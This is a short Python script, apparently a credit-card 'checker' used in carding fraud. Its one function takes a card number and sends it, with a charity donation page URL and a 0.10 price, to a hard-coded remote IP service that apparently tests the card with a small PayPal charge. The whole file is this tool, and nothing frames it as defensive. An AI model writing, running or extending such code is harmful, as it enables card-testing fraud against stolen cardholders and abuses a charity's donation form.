import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://asburyhouse.net/donate/"
	price="0.10"
	res=requests.get(f'http://151.247.197.54:5500/paypal?cc={cc}&url={urll}&price={price}').text
	return res
